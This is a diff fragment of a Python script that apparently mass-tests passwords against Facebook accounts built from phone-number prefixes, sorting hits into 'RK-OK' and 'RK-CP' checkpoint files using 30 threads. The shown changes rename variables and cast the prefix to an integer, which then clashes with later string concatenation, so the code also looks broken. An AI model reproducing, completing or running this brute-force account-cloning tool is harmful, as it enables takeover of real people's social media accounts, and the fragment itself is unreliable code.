@@ -196,7 +196,7 @@ def numcloning():
     print ('\033[1;92m\n   [*] Enter First 4 Digits Of Any Network : ')
     print ("\033[1;93m\n     Example 0300 0345 0320 0303 ")
     print ("")
-    coc=input ('\033[1;95m\nChoice Code :\033[1;93m ')
+    coc=int(input ('\033[1;95m\nChoice Code :\033[1;93m '))
     try:
         list = '.txt'
         for li in open(list, 'r').readlines():
@@ -230,17 +230,17 @@ def numcloning():
             if 'c_user' in rana.cookies.get_dict().keys():
                 print ("\x1b[1;92m[RK-OK] "+coc+user + " | " + pass1)
                 ok=open('RK-ok.txt', 'a')
-                ok.write(uid+ " | " +pass1+ "\n")
+                ok.write(cid+ " | " +pass1+ "\n")
                 ok.close()
-                oks.append(uid+pass1)
+                oks.append(cid+pass1)
             else:
                 if 'checkpoint' in rana.cookies.get_dict().keys():
                     
                     print ("\x1b[1;91m[RK-CP] "+coc+user + " | " + pass1)
                     cp=open('RK random-co.txt', 'a')
-                    cp.write(uid+ " | " +pass1+ "\n")
+                    cp.write(cid+ " | " +pass1+ "\n")
                     cp.close()
-                    cps.append(uid+pass1)
+                    cps.append(cid+pass1)
         except:
             pass
     p = ThreadPool(30)
